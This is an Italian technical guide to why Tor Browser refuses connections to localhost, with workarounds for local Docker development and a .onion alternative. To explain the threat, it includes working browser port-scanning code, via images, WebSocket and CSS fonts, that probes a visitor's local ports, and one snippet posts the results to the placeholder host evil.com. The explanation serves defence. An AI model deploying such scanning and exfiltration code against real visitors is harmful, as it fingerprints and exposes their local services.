> **Lingua / Language**: Italiano | [English](../en/06-configurazioni-avanzate/tor-e-localhost.md)

# Tor e Localhost - Perché Tor Browser Non Accede a Servizi Locali

Questo documento spiega in dettaglio perché Tor Browser blocca le connessioni a
localhost/127.0.0.1, quale attacco previene, e quali sono le soluzioni. Include
scenari Docker, Kubernetes, sviluppo web locale, e alternative via onion services.

Basato sulla mia esperienza diretta: durante il debug di un'applicazione web
dockerizzata (RESTful API su porta 5173) su Kali Linux, Tor Browser rifiutava
la connessione a `localhost:5173`.

> **Vedi anche**: [Tor Browser e Applicazioni](../04-strumenti-operativi/tor-browser-e-applicazioni.md)
> per il confronto browser, [ProxyChains](../04-strumenti-operativi/proxychains-guida-completa.md)
> per il comportamento con localhost, [Onion Services v3](../03-nodi-e-rete/onion-services-v3.md)
> per l'alternativa .onion, [DNS Leak](../05-sicurezza-operativa/dns-leak.md).

---

## Indice

- [Il problema riscontrato](#il-problema-riscontrato)
- [Perché Tor Browser blocca localhost](#perché-tor-browser-blocca-localhost)
- [L'attacco: Local Service Discovery - approfondimento](#lattacco-local-service-discovery--approfondimento)
- [Il blocco tecnico in Tor Browser](#il-blocco-tecnico-in-tor-browser)
- [Soluzioni](#soluzioni)
**Approfondimenti** (file dedicati):
- [Tor e Localhost - Docker e Sviluppo](localhost-docker-e-sviluppo.md) - Docker, sviluppo web, onion services, compatibilità

---

## Il problema riscontrato

Tentando di aprire un'applicazione Docker (porta 5173) tramite Tor Browser:

```
Unable to connect
Firefox can't establish a connection to the server at localhost:5173.
```

Docker funzionava perfettamente:
```yaml
# docker-compose.yml
services:
  api:
    build: .
    ports:
      - "5173:5173"
```

Verifica:
```bash
# Da Firefox normale: ✓ funziona
firefox http://localhost:5173

# Da Tor Browser: ✗ rifiutato
# "Unable to connect"

# Da curl diretto: ✓ funziona
curl http://localhost:5173/api/status
# {"status": "ok"}
```

---

## Perché Tor Browser blocca localhost

### La ragione tecnica

Quando Tor Browser riceve una richiesta verso `localhost` o `127.0.0.1`:

```
Flow richiesta localhost in Tor Browser:
1. Utente digita: http://localhost:5173
2. Tor Browser: "localhost" → deve passare dal proxy SOCKS5
3. SOCKS5 CONNECT → invia "localhost:5173" al daemon Tor
4. Tor: costruisce circuito → Exit Node riceve RELAY_BEGIN "localhost:5173"
5. Exit Node: connect(127.0.0.1:5173) → il SUO localhost, non il tuo!
6. Exit Node: "connection refused" (non ha servizi sulla porta 5173)
7. Tor Browser: "Unable to connect"
```

Ma il blocco non è solo per questo motivo tecnico. È una **misura di sicurezza
attiva** contro attacchi di enumerazione.

---

## L'attacco: Local Service Discovery - approfondimento

### Port scanning via JavaScript

Se Tor Browser permettesse connessioni a localhost, un sito malevolo potrebbe
eseguire un port scan completo della tua macchina:

```html
<!-- evil.com include: -->
<script>
const COMMON_PORTS = [
    3000, 3306, 5173, 5432, 5900, 6379, 8000, 8080, 8443,
    8888, 9000, 9051, 9090, 9200, 27017
];

async function scanPort(port) {
    return new Promise((resolve) => {
        const start = Date.now();
        const img = new Image();
        img.onload = () => resolve({port, status: 'open', time: Date.now() - start});
        img.onerror = () => {
            const elapsed = Date.now() - start;
            // Errore veloce (<50ms) = porta aperta ma non HTTP
            // Errore lento (>1000ms) = porta chiusa (timeout)
            resolve({
                port,
                status: elapsed < 50 ? 'open' : 'closed',
                time: elapsed
            });
        };
        img.src = `http://127.0.0.1:${port}/favicon.ico?${Math.random()}`;
        setTimeout(() => resolve({port, status: 'timeout', time: 5000}), 5000);
    });
}

// Scansiona tutte le porte comuni
Promise.all(COMMON_PORTS.map(scanPort)).then(results => {
    const open = results.filter(r => r.status === 'open');
    // Invia i risultati al server attaccante
    fetch('https://evil.com/report', {
        method: 'POST',
        body: JSON.stringify({ports: open})
    });
});
</script>
```

### Timing-based discovery

Anche senza ricevere risposte, il timing rivela informazioni:

```
Porta chiusa: connect() fallisce dopo timeout (~2000ms)
Porta aperta: connect() fallisce immediatamente (~5ms, "connection reset")
Porta filtrata: nessuna risposta (timeout)

La differenza di tempo è misurabile da JavaScript con precisione <1ms
→ Sufficiente per determinare se un servizio è in esecuzione
```

### WebSocket-based scanning

```javascript
function wsProbe(port) {
    return new Promise((resolve) => {
        const start = performance.now();
        const ws = new WebSocket(`ws://127.0.0.1:${port}`);
        ws.onopen = () => { ws.close(); resolve('open'); };
        ws.onerror = () => {
            const elapsed = performance.now() - start;
            resolve(elapsed < 100 ? 'open-no-ws' : 'closed');
        };
        setTimeout(() => { ws.close(); resolve('timeout'); }, 3000);
    });
}
```

### CSS-based probing (no JavaScript richiesto)

```html
<!-- Funziona anche con JavaScript disabilitato -->
<style>
@font-face {
    font-family: probe;
    src: url('http://127.0.0.1:5173/font.woff');
}
body { font-family: probe, fallback; }
</style>
<!-- Se la porta è aperta, il browser tenta di caricare il font -->
<!-- Il timing del fallback rivela se la porta ha risposto -->
```

### Conseguenze dell'attacco

Basandosi sui servizi scoperti:

| Porta scoperta | Informazione rivelata |
|----------------|----------------------|
| 5173 | Vite dev server (sviluppatore frontend) |
| 3000 | React/Express (sviluppatore web) |
| 3306 | MySQL (ha un database locale) |
| 5432 | PostgreSQL |
| 6379 | Redis |
| 8080 | Tomcat/Proxy |
| 9051 | ControlPort Tor |
| 9200 | Elasticsearch |
| 27017 | MongoDB |

Queste informazioni possono:
- **Fingerprint la macchina**: combinazione unica di servizi
- **Rivelare la professione**: dev frontend, backend, DBA
- **Identificare vulnerabilità**: servizi non patchati accessibili
- **Attaccare servizi locali**: se i servizi non richiedono auth

---

## Il blocco tecnico in Tor Browser

### L'impostazione

Tor Browser imposta in `about:config`:

```
network.proxy.allow_hijacking_localhost = false
```

Questo impedisce a qualsiasi richiesta di raggiungere:
- `127.0.0.0/8` (tutto il range loopback IPv4)
- `::1` (loopback IPv6)
- `0.0.0.0`
- `localhost` (hostname)

### Differenza con Firefox + proxychains

```
Tor Browser:
  → localhost bloccato PRIMA di raggiungere il proxy
  → Protezione attiva a livello browser

Firefox con profilo tor-proxy via proxychains:
  → localhost NON bloccato dal browser
  → proxychains può decidere: proxy o diretto
  → localnet 127.0.0.0/255.0.0.0 in proxychains4.conf
  → Connessione diretta a localhost → FUNZIONA

Risultato:
  Tor Browser: localhost:5173 → BLOCCATO
  Firefox tor-proxy + proxychains: localhost:5173 → FUNZIONA (connessione diretta)
```

---

## Soluzioni

### 1. Usare Firefox normale per servizi locali (la mia soluzione)

```bash
# Per sviluppo locale: Firefox normale (non Tor)
firefox http://localhost:5173

# Per navigazione anonima: Firefox con profilo Tor
proxychains firefox -no-remote -P tor-proxy & disown
```

Separare gli strumenti per caso d'uso. Non serve anonimato per i propri servizi locali.

### 2. torsocks per accesso CLI a servizi locali via Tor

```bash
# torsocks permette connessioni a localhost (con AllowOutboundLocalhost)
torsocks curl http://localhost:5173/api/status
```

In `torsocks.conf`:
```ini
AllowOutboundLocalhost 1
```

### 3. Modificare l'impostazione in Tor Browser (sconsigliato)

In `about:config`:
```
network.proxy.allow_hijacking_localhost = true
```

**ATTENZIONE**: espone ai Local Service Discovery attacks. Da fare solo
temporaneamente per debug su reti fidate. Ricordarsi di ripristinare.

### 4. Esporre il servizio via onion service (la soluzione sicura)

Invece di bypassare la protezione, esporre il servizio locale come `.onion`:

```ini
# torrc
HiddenServiceDir /var/lib/tor/myapp/
HiddenServicePort 80 127.0.0.1:5173
```

Poi accedere via Tor Browser con l'indirizzo `.onion`. Nessun bypass necessario,
la sicurezza è preservata.


---

> **Continua in**: [Tor e Localhost - Docker, Sviluppo Web e Onion Services](localhost-docker-e-sviluppo.md)
> per Docker, sviluppo web locale, onion services e matrice di compatibilità.

---

## Vedi anche

- [Tor e Localhost - Docker e Sviluppo](localhost-docker-e-sviluppo.md) - Docker, sviluppo web, onion services, compatibilità
- [Onion Services v3](../03-nodi-e-rete/onion-services-v3.md) - Alternativa sicura per esporre servizi locali
- [Multi-Istanza e Stream Isolation](multi-istanza-e-stream-isolation.md) - Istanze Tor per servizi diversi
- [Transparent Proxy](transparent-proxy.md) - TransPort e interazione con localhost
- [Scenari Reali](scenari-reali.md) - Casi operativi da pentester
